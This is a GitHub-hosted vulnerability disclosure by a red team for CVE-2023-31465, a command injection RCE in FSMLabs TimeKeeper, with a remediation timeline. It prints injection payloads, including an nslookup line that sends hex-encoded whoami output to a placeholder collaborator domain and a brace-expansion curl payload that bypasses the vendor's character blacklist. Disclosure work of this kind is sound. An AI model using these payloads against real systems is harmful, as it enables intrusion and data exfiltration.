
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCapgeminiCisRedTeam%2FDisclosure%2Fblob%2Fmain%2FCVE%2520PoC%2FCVE-2023-31465.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCapgeminiCisRedTeam%2FDisclosure%2Fblob%2Fmain%2FCVE%2520PoC%2FCVE-2023-31465.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=CapgeminiCisRedTeam%2FDisclosure)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[CapgeminiCisRedTeam](/CapgeminiCisRedTeam)
/
**[Disclosure](/CapgeminiCisRedTeam/Disclosure)**
Public

* [Notifications](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure)
* [Star
   2](/login?return_to=%2FCapgeminiCisRedTeam%2FDisclosure)

* [Code](/CapgeminiCisRedTeam/Disclosure)
* [Issues
  0](/CapgeminiCisRedTeam/Disclosure/issues)
* [Pull requests
  0](/CapgeminiCisRedTeam/Disclosure/pulls)
* [Actions](/CapgeminiCisRedTeam/Disclosure/actions)
* [Projects
  0](/CapgeminiCisRedTeam/Disclosure/projects)
* [Security](/CapgeminiCisRedTeam/Disclosure/security)
* [Insights](/CapgeminiCisRedTeam/Disclosure/pulse)

Additional navigation options

* [Code](/CapgeminiCisRedTeam/Disclosure)
* [Issues](/CapgeminiCisRedTeam/Disclosure/issues)
* [Pull requests](/CapgeminiCisRedTeam/Disclosure/pulls)
* [Actions](/CapgeminiCisRedTeam/Disclosure/actions)
* [Projects](/CapgeminiCisRedTeam/Disclosure/projects)
* [Security](/CapgeminiCisRedTeam/Disclosure/security)
* [Insights](/CapgeminiCisRedTeam/Disclosure/pulse)

## Files

 main
## Breadcrumbs

1. [Disclosure](/CapgeminiCisRedTeam/Disclosure/tree/main)
2. /[CVE PoC](/CapgeminiCisRedTeam/Disclosure/tree/main/CVE%20PoC)
/
# CVE-2023-31465.md

Copy path Blame  Blame
## Latest commit

## History

[History](/CapgeminiCisRedTeam/Disclosure/commits/main/CVE%20PoC/CVE-2023-31465.md)78 lines (44 loc) · 2.96 KB main
## Breadcrumbs

1. [Disclosure](/CapgeminiCisRedTeam/Disclosure/tree/main)
2. /[CVE PoC](/CapgeminiCisRedTeam/Disclosure/tree/main/CVE%20PoC)
/
# CVE-2023-31465.md

Top
## File metadata and controls

* Preview
* Code
* Blame

78 lines (44 loc) · 2.96 KB[Raw](https://github.com/CapgeminiCisRedTeam/Disclosure/raw/refs/heads/main/CVE%20PoC/CVE-2023-31465.md)
# CVE-2023-31465 | TimeKeeper by FSMLabs - RCE

During a PT activity, we managed to find a Remote Command Execution vulnerability in TimeKeeper and, while fixing it, we had the opportunity to modify and evolve the payload.
In the first paragraph we are going to explain the discovery and exploitation of the vulnerability, and this was performed during the time of the penetration testing, while in the second paragraph
we will show the fix attempts, the re-exploitation and the final countermeasure.

## TimeKeeper version 8.0.17

In the image below is represented the request that is employed by TimeKeeper in order to set the source of IPs that has to be synchronized.

[![req](https://private-user-images.githubusercontent.com/132057950/256232373-f6e13bf7-2755-40f4-8d8c-09cf66116815.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyMzczLWY2ZTEzYmY3LTI3NTUtNDBmNC04ZDhjLTA5Y2Y2NjExNjgxNS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02MGI5ZmM2NjJkNjdkMDU5MWViZGVhYzFhYjIwYWYxZjBlYTZkZGIzNjlkMjhhYjk4MmJhMWZlY2QzNzQ0ZGNkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.CY2Mbhj46YbLMyC1l8MSsGDiRd--cTu3YPlqiSzdcmM)](https://private-user-images.githubusercontent.com/132057950/256232373-f6e13bf7-2755-40f4-8d8c-09cf66116815.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyMzczLWY2ZTEzYmY3LTI3NTUtNDBmNC04ZDhjLTA5Y2Y2NjExNjgxNS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02MGI5ZmM2NjJkNjdkMDU5MWViZGVhYzFhYjIwYWYxZjBlYTZkZGIzNjlkMjhhYjk4MmJhMWZlY2QzNzQ0ZGNkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.CY2Mbhj46YbLMyC1l8MSsGDiRd--cTu3YPlqiSzdcmM)

During our first analysis, we used some Windows and Linux concatenation strings with the `ping` command to check a potential RCE vulnerability.
We first discovered it in the *arg2* query parameter, with the following payload appended to the **earliest** number value:

```
||ping -c 10 127.0.0.1

```

A time delay was triggered, so we kept testing with other techniques and payloads.

After some time, we uncovered the following payload, useful for retrieving hex-encoded information (the data has been hex-encoded with *xxd* in order to avoid cutting off due to the DNS protocol):

```
||nslookup $(xxd -pu <<< $(whoami)).OASTIFY.DOMAIN||x

```

Below you can observe, respectively:

* the malicious request;

[![poc1](https://private-user-images.githubusercontent.com/132057950/256232522-1a99f5a7-939a-4bfd-aab9-f9226e0d3351.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNTIyLTFhOTlmNWE3LTkzOWEtNGJmZC1hYWI5LWY5MjI2ZTBkMzM1MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZmZhMmQ2M2YxYWNmYjg2ZGY3YTY2YWVmZGRkNTY0MjRhZjRjMmQ1ZTFjMjYxZmIyZTYxMzU0OTE4ZDJhMWY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BT1qyQuUNh73sVizfwC6CAj2CD2vRwT2wVfQIqFfHxk)](https://private-user-images.githubusercontent.com/132057950/256232522-1a99f5a7-939a-4bfd-aab9-f9226e0d3351.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNTIyLTFhOTlmNWE3LTkzOWEtNGJmZC1hYWI5LWY5MjI2ZTBkMzM1MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00ZmZhMmQ2M2YxYWNmYjg2ZGY3YTY2YWVmZGRkNTY0MjRhZjRjMmQ1ZTFjMjYxZmIyZTYxMzU0OTE4ZDJhMWY3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BT1qyQuUNh73sVizfwC6CAj2CD2vRwT2wVfQIqFfHxk)

* the burp collaborator DNS interactions with hex-data exfiltrated;

[![poc2](https://private-user-images.githubusercontent.com/132057950/256232696-265b70a5-a80c-4dea-9143-5663f9aab18b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNjk2LTI2NWI3MGE1LWE4MGMtNGRlYS05MTQzLTU2NjNmOWFhYjE4Yi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNjlkMGM4ZjIxYmMyNWVkOTQ5YzY2OWUzM2JjNWE2MWIzYWY1NTA5YmI0MDQzMGFmYzE4ZDhjOWZkMmZhYWY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VspROFsSeESHutrV7o_d9umiBoNkclIDrsO2nIen0rE)](https://private-user-images.githubusercontent.com/132057950/256232696-265b70a5-a80c-4dea-9143-5663f9aab18b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNjk2LTI2NWI3MGE1LWE4MGMtNGRlYS05MTQzLTU2NjNmOWFhYjE4Yi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNjlkMGM4ZjIxYmMyNWVkOTQ5YzY2OWUzM2JjNWE2MWIzYWY1NTA5YmI0MDQzMGFmYzE4ZDhjOWZkMmZhYWY5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VspROFsSeESHutrV7o_d9umiBoNkclIDrsO2nIen0rE)

* the hex-decoded results of `whoami` and `id` commands.

[![poc3](https://private-user-images.githubusercontent.com/132057950/256232758-61f12806-36ba-46b7-b0d0-c928e0b7275d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNzU4LTYxZjEyODA2LTM2YmEtNDZiNy1iMGQwLWM5MjhlMGI3Mjc1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01YTU3ODU3YjdkNWEzNWJiZDJmNWY4ZTg2NDk5Njk0MzZhZDI4ZTliOTYyZDRkM2Q0MDQzZTkwOWQzZjAwNzBmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9._xEHiEH0PqmGiHlBy0Z5fbzE4dXjjvr0fj5zwyVjXdY)](https://private-user-images.githubusercontent.com/132057950/256232758-61f12806-36ba-46b7-b0d0-c928e0b7275d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NTY0MTMsIm5iZiI6MTczNjU1NjExMywicGF0aCI6Ii8xMzIwNTc5NTAvMjU2MjMyNzU4LTYxZjEyODA2LTM2YmEtNDZiNy1iMGQwLWM5MjhlMGI3Mjc1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMDQxNTNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01YTU3ODU3YjdkNWEzNWJiZDJmNWY4ZTg2NDk5Njk0MzZhZDI4ZTliOTYyZDRkM2Q0MDQzZTkwOWQzZjAwNzBmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9._xEHiEH0PqmGiHlBy0Z5fbzE4dXjjvr0fj5zwyVjXdY)

## TimeKeeper version 8.0.28 (BETA)

After discovering the vulnerability, we contacted directly FSMLabs to notify about the critical vulnerability.
They thanked and asked us to conduct more tests on the BETA version to ensure that the vulnerability has been fixed in the meanwhile, as version 8.0.17 was over 2 years old at the time of testing
(2023).

A blacklist was implemented for some characters, such as: |, &, \*, $, <, >, (, ), -. The previous payload, then, could not be used anymore. However, curly brackets were not
blacklisted, so we tried with the *bash expansion* technique.

Specifically, the following payload was injected:

```
;{curl,`whoami`.[collaborator_domain]};a

```

and we were still able to conduct a remote command execution.

## Remediation

The FSMLabs has fixed the vulnerability in TimeKeeper version 8.0.28.

## Vulnerable version of TimeKeeper

As a result of our testing, versions 8.0.17 through 8.0.27 are vulnerable to RCE.

## Discovered by

Francesco Iaria

Riccardo Degli Esposti

Claudio Rimensi

Francesco Varotto

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

